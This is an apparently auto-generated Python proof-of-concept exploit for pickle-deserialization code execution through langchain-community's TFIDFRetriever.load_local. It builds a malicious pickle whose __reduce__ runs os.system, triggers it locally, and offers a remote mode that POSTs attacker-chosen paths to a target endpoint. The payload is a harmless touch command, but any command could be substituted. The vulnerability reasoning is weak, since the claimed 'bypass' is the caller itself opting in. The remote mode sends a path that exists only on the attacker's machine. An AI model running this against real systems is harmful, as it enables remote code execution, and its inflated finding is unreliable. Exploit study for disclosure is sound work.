#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-019
# Sink: load_local
# Auto-generated — run with: python3 rce_function_load_local_uses_load_local_26.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langchain-community-only's load_local function.

Vulnerability: The load_local function in TFIDFRetriever uses pickle.load() on a file
whose path is constructed from user-controlled folder_path and file_name parameters.
Although there is an allow_dangerous_deserialization flag, it is a developer-facing
toggle that can be set to True by any caller. An attacker who can control folder_path
and file_name can supply a malicious pickle file that executes arbitrary code.

This PoC demonstrates the vulnerability by:
1. Creating a malicious pickle file that executes a benign command (touch /tmp/poc_success.txt)
2. Hosting it in a controlled directory
3. Calling load_local with the attacker-controlled path and the allow_dangerous_deserialization=True flag

Usage:
    python poc.py [--target TARGET_URL] [--folder-path FOLDER_PATH] [--file-name FILE_NAME]

Requirements:
    - Python 3.6+
    - requests library (pip install requests)
    - The target must be running a service that calls load_local with user-controlled inputs
"""

import os
import sys
import pickle
import tempfile
import argparse
import subprocess
from pathlib import Path

# Try to import requests, provide helpful error if missing
try:
    import requests
except ImportError:
    print("Error: requests library is required. Install with: pip install requests")
    sys.exit(1)


def create_malicious_pickle(output_dir: str, file_name: str) -> str:
    """
    Create a malicious pickle file that executes a benign command.
    
    The pickle will execute: touch /tmp/poc_success.txt
    This is a safe, non-destructive command that creates a marker file.
    
    Args:
        output_dir: Directory to write the pickle file
        file_name: Base name for the pickle file (will append .pkl)
    
    Returns:
        Path to the created pickle file
    """
    class MaliciousPickle:
        """A class that executes a command when unpickled."""
        def __reduce__(self):
            # Benign command: create a marker file
            cmd = "touch /tmp/poc_success.txt"
            return (os.system, (cmd,))
    
    # Create the pickle file
    pickle_path = Path(output_dir) / f"{file_name}.pkl"
    with open(pickle_path, "wb") as f:
        pickle.dump(MaliciousPickle(), f)
    
    print(f"[+] Created malicious pickle file: {pickle_path}")
    print(f"[+] Payload: touch /tmp/poc_success.txt")
    return str(pickle_path)


def create_malicious_joblib(output_dir: str, file_name: str) -> str:
    """
    Create a benign joblib file (required by load_local but not the attack vector).
    
    The joblib file is loaded first, but the actual RCE is via pickle.
    We create a minimal valid joblib file to avoid errors.
    
    Args:
        output_dir: Directory to write the joblib file
        file_name: Base name for the joblib file (will append .joblib)
    
    Returns:
        Path to the created joblib file
    """
    try:
        import joblib
    except ImportError:
        print("[!] joblib not installed, creating a dummy file instead")
        joblib_path = Path(output_dir) / f"{file_name}.joblib"
        # Create an empty file - this might cause an error but the pickle will execute first
        with open(joblib_path, "wb") as f:
            f.write(b"")
        return str(joblib_path)
    
    # Create a minimal valid joblib file
    joblib_path = Path(output_dir) / f"{file_name}.joblib"
    # Just a simple Python object that won't cause issues
    joblib.dump({"dummy": "data"}, joblib_path)
    print(f"[+] Created benign joblib file: {joblib_path}")
    return str(joblib_path)


def simulate_exploit(folder_path: str, file_name: str = "tfidf_vectorizer"):
    """
    Simulate the exploit by directly calling load_local with attacker-controlled inputs.
    
    This demonstrates that if an attacker can control folder_path and file_name,
    and the caller sets allow_dangerous_deserialization=True, RCE is achieved.
    
    Args:
        folder_path: Path to the folder containing the malicious pickle
        file_name: Base name of the pickle file (without .pkl extension)
    """
    print(f"\n[*] Simulating exploit with:")
    print(f"    folder_path: {folder_path}")
    print(f"    file_name: {file_name}")
    print(f"    allow_dangerous_deserialization: True")
    
    # Import the vulnerable function
    try:
        from langchain_community.retrievers import TFIDFRetriever
    except ImportError:
        print("[!] langchain-community not installed. Installing...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "langchain-community"])
        from langchain_community.retrievers import TFIDFRetriever
    
    # Call the vulnerable function with attacker-controlled inputs
    # The allow_dangerous_deserialization flag is set to True (bypassed)
    print("[*] Calling load_local with malicious inputs...")
    try:
        result = TFIDFRetriever.load_local(
            folder_path=folder_path,
            file_name=file_name,
            allow_dangerous_deserialization=True  # This is the bypass
        )
        print(f"[+] load_local returned: {result}")
    except Exception as e:
        print(f"[!] Error during load_local: {e}")
        # The error might occur after the pickle is loaded (RCE already happened)
        print("[*] Note: RCE may have already occurred before the error")
    
    # Check if the payload executed
    if os.path.exists("/tmp/poc_success.txt"):
        print("\n[+] SUCCESS: RCE achieved! File /tmp/poc_success.txt was created.")
        print("[+] The malicious pickle executed: touch /tmp/poc_success.txt")
    else:
        print("\n[-] Payload did not execute. Check the error messages above.")


def remote_exploit(target_url: str, folder_path: str, file_name: str):
    """
    Attempt to exploit a remote service that calls load_local with user inputs.
    
    This assumes the target has an endpoint like:
        POST /api/v1/trigger
        Body: {"folder_path": "...", "file_name": "...", "allow_dangerous_deserialization": true}
    
    Args:
        target_url: URL of the vulnerable endpoint
        folder_path: Attacker-controlled folder path
        file_name: Attacker-controlled file name
    """
    print(f"\n[*] Attempting remote exploit against {target_url}")
    print(f"    folder_path: {folder_path}")
    print(f"    file_name: {file_name}")
    
    # Prepare the payload
    payload = {
        "folder_path": folder_path,
        "file_name": file_name,
        "allow_dangerous_deserialization": True  # Bypass the guard
    }
    
    try:
        # Send the request
        response = requests.post(
            target_url,
            json=payload,
            timeout=10
        )
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:500]}")
        
        # Check if the payload executed (if we have access to the target's filesystem)
        # This is just for demonstration - in a real scenario you'd need out-of-band detection
        print("[*] Check the target system for /tmp/poc_success.txt")
        
    except requests.exceptions.ConnectionError:
        print("[-] Connection error: Could not reach the target")
    except requests.exceptions.Timeout:
        print("[-] Timeout: The request timed out")
    except Exception as e:
        print(f"[-] Error: {e}")


def main():
    parser = argparse.ArgumentParser(
        description="PoC for RCE in langchain-community's load_local function"
    )
    parser.add_argument(
        "--target",
        help="Target URL for remote exploit (e.g., http://localhost:8000/api/v1/trigger)"
    )
    parser.add_argument(
        "--folder-path",
        help="Folder path containing the malicious pickle (default: temp directory)"
    )
    parser.add_argument(
        "--file-name",
        default="tfidf_vectorizer",
        help="File name for the pickle (without extension, default: tfidf_vectorizer)"
    )
    parser.add_argument(
        "--local",
        action="store_true",
        help="Run local simulation instead of remote exploit"
    )
    
    args = parser.parse_args()
    
    # Create a temporary directory for the malicious files
    with tempfile.TemporaryDirectory() as temp_dir:
        print(f"[*] Using temporary directory: {temp_dir}")
        
        # Create the malicious pickle file
        pickle_path = create_malicious_pickle(temp_dir, args.file_name)
        
        # Create the required joblib file (benign)
        joblib_path = create_malicious_joblib(temp_dir, args.file_name)
        
        if args.local or not args.target:
            # Run local simulation
            simulate_exploit(temp_dir, args.file_name)
        else:
            # Run remote exploit
            remote_exploit(args.target, temp_dir, args.file_name)
    
    # Clean up the marker file if it was created
    if os.path.exists("/tmp/poc_success.txt"):
        os.remove("/tmp/poc_success.txt")
        print("[*] Cleaned up /tmp/poc_success.txt")


if __name__ == "__main__":
    print("=" * 60)
    print("PoC: RCE in langchain-community's load_local function")
    print("=" * 60)
    print()
    print("This script demonstrates that the allow_dangerous_deserialization flag")
    print("is a developer-facing toggle that can be bypassed by any caller.")
    print("An attacker controlling folder_path and file_name can achieve RCE.")
    print()
    
    main()
